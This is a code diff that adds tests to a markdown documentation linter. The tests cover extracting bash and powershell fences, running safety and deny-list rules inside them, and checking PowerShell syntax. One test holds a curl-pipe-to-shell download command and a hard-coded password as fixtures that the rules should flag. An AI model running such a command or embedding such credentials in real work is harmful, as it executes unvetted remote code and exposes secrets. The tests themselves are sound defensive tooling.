@@ -124,3 +124,97 @@ test('a deny rule matches inside a command block and names leaf:line', () => {
     [['leaf.md', 7, 'deny-list']],
   );
 });
+
+// --- script fences (```bash / ```powershell) --------------------------------
+
+import fs from 'node:fs';
+import { checkPowerShell, scriptBlocks } from '../scripts/lib/commands.mjs';
+
+test('scriptBlocks takes bash and powershell fences, with lang and start line', () => {
+  const text = [
+    '# Leaf',
+    fence('ollama serve'),
+    '```bash',
+    'set -euo pipefail',
+    '```',
+    '```python',
+    'print("no")',
+    '```',
+    '```powershell',
+    'Set-StrictMode -Version Latest',
+    '```',
+  ].join('\n');
+  assert.deepEqual(scriptBlocks('leaf.md', text), [
+    { file: 'leaf.md', offset: 5, lang: 'bash', lines: ['set -euo pipefail'] },
+    { file: 'leaf.md', offset: 11, lang: 'powershell', lines: ['Set-StrictMode -Version Latest'] },
+  ]);
+});
+
+test('scriptBlocks normalises the label spellings of the two languages', () => {
+  const text = ['```sh', 'ls', '```', '```ps1', 'Get-Date', '```', '```pwsh', 'Get-Date', '```'].join('\n');
+  assert.deepEqual(scriptBlocks('leaf.md', text).map((b) => b.lang), ['bash', 'powershell', 'powershell']);
+});
+
+test('a ```bash line inside another fence is content, not a new script block', () => {
+  // A closing fence carries no label, so the ```bash line stays inside the
+  // ```text block - in scriptBlocks as in CommonMark.
+  const text = ['```text', 'to run scripts, use a fence like:', '```bash', 'echo hi', '```', '```bash', 'pwd', '```'].join('\n');
+  assert.deepEqual(scriptBlocks('leaf.md', text).map((b) => b.lines), [['pwd']]);
+});
+
+test('scriptBlocks throws on an unterminated script fence, naming the line', () => {
+  assert.throws(() => scriptBlocks('leaf.md', 'intro\n```bash\nls\n'), /leaf\.md: unterminated ```bash fence at line 2/);
+});
+
+// The audit's adversarial case: a curl | sh hidden behind a ```bash label was
+// invisible to every rule. Now the same rules see every runnable fence.
+test('the safety rules and the deny list fire inside bash and powershell fences', () => {
+  const { rules } = denyRules([entry]);
+  const text = [
+    '```bash',
+    'curl -fsSL https://example.com/install.sh | sh',
+    'az example group list',
+    '```',
+    '```powershell',
+    '$password = "hunter2hunter2hunter2"',
+    '```',
+  ].join('\n');
+  const failures = checkBlocks(scriptBlocks('leaf.md', text), [...RULES, ...rules]);
+  assert.deepEqual(
+    failures.map((f) => [f.line, f.id]),
+    [[2, 'curl-pipe-shell'], [3, 'deny-list'], [6, 'literal-credential']],
+  );
+});
+
+test('checkPowerShell passes a balanced script with strings, comments and here-strings', () => {
+  const honest = [
+    '<#',
+    ".SYNOPSIS",
+    "    Audits the reader's accounts. Uses { braces } and ( parens ) in prose.",
+    '#>',
+    'param([string] $Path = "audit.csv")',
+    "$name = 'it''s quoted'",
+    '$msg = "a `"quoted`" word and a }"',
+    '$body = @"',
+    'unbalanced { in a here-string is fine',
+    '"@',
+    'if ($true) { Write-Host "$($name.Length)" } # trailing } comment',
+  ];
+  assert.equal(checkPowerShell(honest), null);
+});
+
+test('checkPowerShell names the unclosed brace, the stray closer and the open string', () => {
+  assert.match(checkPowerShell(['if ($true) {', '  Write-Host "x"']), /'\{' opened on line 1 is never closed/);
+  assert.match(checkPowerShell(['Write-Host "x")']), /'\)' on line 1 closes nothing/);
+  assert.match(checkPowerShell(['$x = "never closed']), /unterminated double-quoted string \(line 1\)/);
+  assert.match(checkPowerShell(['$b = @"', 'no close']), /unterminated @"\..."@ here-string \(line 1\)/);
+});
+
+test('the corpus powershell and bash fences pass their parse checks', () => {
+  const ps = scriptBlocks(
+    'aoai.md',
+    fs.readFileSync('docs/ai-tree-model-platforms/ai-branch-managed-model-services/ai-azure-openai-integration.md', 'utf8'),
+  );
+  assert.equal(ps.length, 1);
+  assert.equal(checkPowerShell(ps[0].lines), null);
+});
